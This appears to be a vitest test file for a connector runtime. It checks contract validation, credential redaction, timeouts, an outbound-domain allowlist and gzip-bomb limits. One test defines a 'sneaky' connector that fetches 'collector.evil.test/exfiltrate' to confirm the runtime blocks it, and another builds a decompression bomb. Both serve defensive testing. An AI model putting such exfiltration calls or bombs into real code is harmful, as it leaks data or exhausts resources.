import type {
  CheckResult,
  ConnectionContext,
  Connector,
  ConnectorManifest,
  Observation,
  SyncRequest,
  SyncResult,
} from "@netrics/connector-sdk";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import { gunzipSync, gzipSync } from "node:zlib";

import { describe, expect, it } from "vitest";

import { demoManifest } from "@netrics/connectors";

import {
  ContractViolationError,
  executeCheck,
  executeDiscover,
  executeSync,
} from "./execute.js";

const baseContext: ConnectionContext = {
  connectionId: "conn-1",
  config: {},
  credentials: {},
};

const request: SyncRequest = {
  mode: "backfill",
  from: "2024-01-01T00:00:00.000Z",
  to: "2024-01-02T00:00:00.000Z",
};

function observation(overrides: Partial<Observation> = {}): Observation {
  return {
    metricKey: "demo.visitors",
    sourceTimestamp: "2024-01-01T00:00:00.000Z",
    value: 42,
    dimensions: { resource: "demo-site-1" },
    ...overrides,
  };
}

function connectorWith(
  manifest: ConnectorManifest,
  sync?: (context: ConnectionContext, request: SyncRequest) => unknown,
  check?: () => unknown,
): Connector {
  return {
    manifest,
    async check() {
      return (check?.() ?? { ok: true }) as CheckResult;
    },
    async discover() {
      return [];
    },
    async sync(context, req) {
      return (sync?.(context, req) ?? {
        observations: [],
        done: true,
      }) as SyncResult;
    },
  };
}

describe("executeSync", () => {
  it("passes valid results through", async () => {
    const connector = connectorWith(demoManifest, () => ({
      observations: [observation()],
      nextCursor: "2024-01-01T00:00:00.000Z",
      done: true,
    }));
    const result = await executeSync(connector, baseContext, request);
    expect(result.observations).toHaveLength(1);
    expect(result.done).toBe(true);
  });

  it("rejects an invalid request before calling the connector", async () => {
    let called = false;
    const connector = connectorWith(demoManifest, () => {
      called = true;
      return { observations: [], done: true };
    });
    await expect(
      executeSync(connector, baseContext, { ...request, from: request.to }),
    ).rejects.toBeInstanceOf(ContractViolationError);
    expect(called).toBe(false);
  });

  it("rejects observations with undeclared metric keys", async () => {
    const connector = connectorWith(demoManifest, () => ({
      observations: [observation({ metricKey: "demo.revenue" })],
      done: true,
    }));
    await expect(executeSync(connector, baseContext, request)).rejects.toThrow(
      /undeclared metric key "demo.revenue"/,
    );
  });

  it("rejects observations with undeclared dimensions", async () => {
    const connector = connectorWith(demoManifest, () => ({
      observations: [
        observation({ dimensions: { resource: "demo-site-1", country: "de" } }),
      ],
      done: true,
    }));
    await expect(executeSync(connector, baseContext, request)).rejects.toThrow(
      /undeclared dimension "country"/,
    );
  });

  describe("currency_minor amounts", () => {
    const manifest: ConnectorManifest = {
      ...demoManifest,
      metrics: [
        {
          key: "demo.proceeds",
          name: "Proceeds",
          description: "Proceeds per currency.",
          kind: "delta",
          unit: "currency_minor",
          granularity: "day",
          dimensions: ["resource", "currency"],
          aggregations: ["sum"],
        },
      ],
    };
    const amount = (dimensions: Record<string, string>, value = 1234) =>
      observation({ metricKey: "demo.proceeds", dimensions, value });
    const run = (observations: Observation[]) =>
      executeSync(
        connectorWith(manifest, () => ({ observations, done: true })),
        baseContext,
        request,
      );

    it("accepts integer minor units with an ISO 4217 currency", async () => {
      const result = await run([
        amount({ resource: "app-1", currency: "EUR" }),
        amount({ resource: "app-1", currency: "JPY" }, 500),
      ]);
      expect(result.observations).toHaveLength(2);
    });

    it.each([
      ["no currency", { resource: "app-1" }],
      ["a lowercase code", { resource: "app-1", currency: "eur" }],
      ["a name", { resource: "app-1", currency: "Euro" }],
    ])("rejects an amount with %s", async (_label, dimensions) => {
      await expect(run([amount(dimensions)])).rejects.toThrow(
        /without an ISO 4217 "currency" dimension/,
      );
    });

    it("rejects fractional minor units", async () => {
      await expect(
        run([amount({ resource: "app-1", currency: "EUR" }, 12.5)]),
      ).rejects.toThrow(/not in integer minor units/);
    });
  });

  it("rejects malformed transport objects", async () => {
    const connector = connectorWith(demoManifest, () => ({
      observations: [observation({ value: Number.NaN })],
      done: true,
    }));
    await expect(
      executeSync(connector, baseContext, request),
    ).rejects.toBeInstanceOf(ContractViolationError);
  });

  it("redacts credential values from thrown connector errors", async () => {
    const context: ConnectionContext = {
      ...baseContext,
      credentials: { token: "sk-live-9f8e7d6c" },
    };
    const connector = connectorWith(demoManifest, () => {
      throw new Error("provider 401 for token sk-live-9f8e7d6c");
    });
    const failure = await executeSync(connector, context, request).catch(
      (error: unknown) => error,
    );
    expect(failure).toBeInstanceOf(Error);
    expect((failure as Error).message).not.toContain("sk-live-9f8e7d6c");
    expect((failure as Error).message).toContain("[redacted]");
    // A plain thrown error is NOT a contract violation: it is the retryable
    // provider-failure convention.
    expect(failure).not.toBeInstanceOf(ContractViolationError);
  });

  it("refuses contexts carrying function-typed values (capability leak)", async () => {
    let called = false;
    const connector = connectorWith(demoManifest, () => {
      called = true;
      return { observations: [], done: true };
    });
    const leaking: ConnectionContext = {
      ...baseContext,
      config: { db: async () => "handle" },
    };
    await expect(executeSync(connector, leaking, request)).rejects.toThrow(
      /function at config\.db/,
    );
    expect(called).toBe(false);
  });
});

describe("executeCheck", () => {
  it("passes ok results through", async () => {
    const connector = connectorWith(demoManifest, undefined, () => ({
      ok: true,
    }));
    await expect(executeCheck(connector, baseContext)).resolves.toEqual({
      ok: true,
    });
  });

  it("redacts credential values from failure messages", async () => {
    const context: ConnectionContext = {
      ...baseContext,
      credentials: { token: "sk-live-9f8e7d6c" },
    };
    const connector = connectorWith(demoManifest, undefined, () => ({
      ok: false,
      message: "token sk-live-9f8e7d6c rejected",
    }));
    const result = await executeCheck(connector, context);
    expect(result.ok).toBe(false);
    expect(result.message).not.toContain("sk-live-9f8e7d6c");
  });

  it("rejects malformed check results as contract violations", async () => {
    const connector = connectorWith(
      demoManifest,
      undefined,
      () => ({ status: "great" }) as unknown,
    );
    await expect(executeCheck(connector, baseContext)).rejects.toBeInstanceOf(
      ContractViolationError,
    );
  });
});

describe("executeDiscover", () => {
  it("passes valid resource lists through", async () => {
    const connector: Connector = {
      ...connectorWith(demoManifest),
      async discover() {
        return [{ id: "r1", name: "Resource 1", kind: "site" }];
      },
    };
    await expect(executeDiscover(connector, baseContext)).resolves.toEqual([
      { id: "r1", name: "Resource 1", kind: "site" },
    ]);
  });

  it("rejects malformed resources as contract violations", async () => {
    const connector: Connector = {
      ...connectorWith(demoManifest),
      async discover() {
        return [{ id: "" }] as unknown as [];
      },
    };
    await expect(
      executeDiscover(connector, baseContext),
    ).rejects.toBeInstanceOf(ContractViolationError);
  });

  it("redacts credential values from thrown discover errors", async () => {
    const context: ConnectionContext = {
      ...baseContext,
      credentials: { token: "sk-live-9f8e7d6c" },
    };
    const connector: Connector = {
      ...connectorWith(demoManifest),
      async discover() {
        throw new Error("provider rejected token sk-live-9f8e7d6c");
      },
    };
    await expect(executeDiscover(connector, context)).rejects.toThrow(
      /rejected token/,
    );
    await expect(executeDiscover(connector, context)).rejects.not.toThrow(
      /sk-live-9f8e7d6c/,
    );
  });
});

describe("runtime capabilities", () => {
  it("times out a connector call even when the connector ignores the signal", async () => {
    const hanging: Connector = {
      ...connectorWith(demoManifest),
      sync: () => new Promise<SyncResult>(() => {}),
    };
    await expect(
      executeSync(hanging, baseContext, request, { timeoutMs: 50 }),
    ).rejects.toThrow(/did not answer within 50 ms/);
  });

  it("aborts the runtime signal when the budget runs out", async () => {
    let aborted = false;
    const cooperative: Connector = {
      ...connectorWith(demoManifest),
      sync: (_context, _request, runtime) =>
        new Promise<SyncResult>((_, reject) => {
          runtime.signal.addEventListener("abort", () => {
            aborted = true;
            reject(new Error("aborted"));
          });
        }),
    };
    await expect(
      executeSync(cooperative, baseContext, request, { timeoutMs: 50 }),
    ).rejects.toThrow();
    expect(aborted).toBe(true);
  });

  it("treats fetching an undeclared host as a broken connector", async () => {
    // The demo manifest declares no outbound domains at all.
    const sneaky: Connector = {
      ...connectorWith(demoManifest),
      sync: async (_context, _request, runtime) => {
        await runtime.fetch("https://collector.evil.test/exfiltrate");
        return { observations: [], done: true };
      },
    };
    await expect(executeSync(sneaky, baseContext, request)).rejects.toThrow(
      ContractViolationError,
    );
    await expect(executeSync(sneaky, baseContext, request)).rejects.toThrow(
      /not in the connector's outboundDomains/,
    );
  });

  it("reports response statuses to the host, without bodies", async () => {
    // ADR 0012: the host notices a provider 401 to refresh the token.
    const server = createServer((req, res) => {
      res.writeHead(req.url === "/denied" ? 401 : 200);
      res.end("body");
    });
    await new Promise<void>((resolve) =>
      server.listen(0, "127.0.0.1", resolve),
    );
    const { port } = server.address() as AddressInfo;
    try {
      const statuses: number[] = [];
      const caller: Connector = {
        ...connectorWith({ ...demoManifest, outboundDomains: ["127.0.0.1"] }),
        sync: async (_context, _request, runtime) => {
          await runtime.fetch(`http://127.0.0.1:${port}/ok`);
          await runtime.fetch(`http://127.0.0.1:${port}/denied`);
          return { observations: [], done: true };
        },
      };
      await executeSync(caller, baseContext, request, {
        onResponse: (status) => statuses.push(status),
        egress: { allowInsecureHttp: true, allowPrivateAddresses: true },
      });
      expect(statuses).toEqual([200, 401]);
    } finally {
      server.close();
    }
  });
});

describe("binary bodies (SDK 0.2.2)", () => {
  // The bounded-gunzip pattern from the connector docs: the response cap
  // bounds the compressed bytes, and maxOutputLength bounds what they
  // inflate to.
  const MAX_INFLATED_BYTES = 1024 * 1024;
  function inflate(bytes: Uint8Array): string {
    try {
      return gunzipSync(bytes, {
        maxOutputLength: MAX_INFLATED_BYTES,
      }).toString("utf8");
    } catch (error) {
      if ((error as { code?: string }).code === "ERR_BUFFER_TOO_LARGE") {
        throw new Error(
          `report exceeds ${MAX_INFLATED_BYTES} bytes when decompressed`,
          { cause: error },
        );
      }
      throw error;
    }
  }

  async function withGzipServer(
    bodies: Record<string, Buffer>,
    run: (port: number) => Promise<void>,
  ) {
    const server = createServer((req, res) => {
      const body = bodies[req.url ?? ""];
      res.writeHead(body ? 200 : 404, { "content-type": "application/a-gzip" });
      res.end(body);
    });
    await new Promise<void>((resolve) =>
      server.listen(0, "127.0.0.1", resolve),
    );
    try {
      await run((server.address() as AddressInfo).port);
    } finally {
      server.close();
    }
  }

  function gzipReader(port: number, path: string): Connector {
    return {
      ...connectorWith({ ...demoManifest, outboundDomains: ["127.0.0.1"] }),
      sync: async (_context, _request, runtime) => {
        const response = await runtime.fetch(`http://127.0.0.1:${port}${path}`);
        const units = Number(inflate(response.bytes()).split("\t")[1]);
        return {
          observations: [observation({ value: units })],
          done: true,
        };
      },
    };
  }

  const egress = { allowInsecureHttp: true, allowPrivateAddresses: true };

  it("lets a connector inflate a gzip report it fetched", async () => {
    await withGzipServer(
      { "/report.gz": gzipSync("units\t42\n") },
      async (port) => {
        const result = await executeSync(
          gzipReader(port, "/report.gz"),
          baseContext,
          request,
          { egress },
        );
        expect(result.observations[0]?.value).toBe(42);
      },
    );
  });

  it("fails a gzip bomb as a provider error, not a crash or contract violation", async () => {
    // About 16 KiB on the wire, well under the response cap, but 16 MiB
    // once inflated.
    const bomb = gzipSync(Buffer.alloc(16 * 1024 * 1024));
    expect(bomb.byteLength).toBeLessThan(64 * 1024);
    await withGzipServer({ "/bomb.gz": bomb }, async (port) => {
      const failure = await executeSync(
        gzipReader(port, "/bomb.gz"),
        baseContext,
        request,
        { egress },
      ).then(
        () => null,
        (error: unknown) => error,
      );
      expect(failure).toBeInstanceOf(Error);
      expect(failure).not.toBeInstanceOf(ContractViolationError);
      expect((failure as Error).message).toMatch(
        /exceeds 1048576 bytes when decompressed/,
      );
    });
  });
});
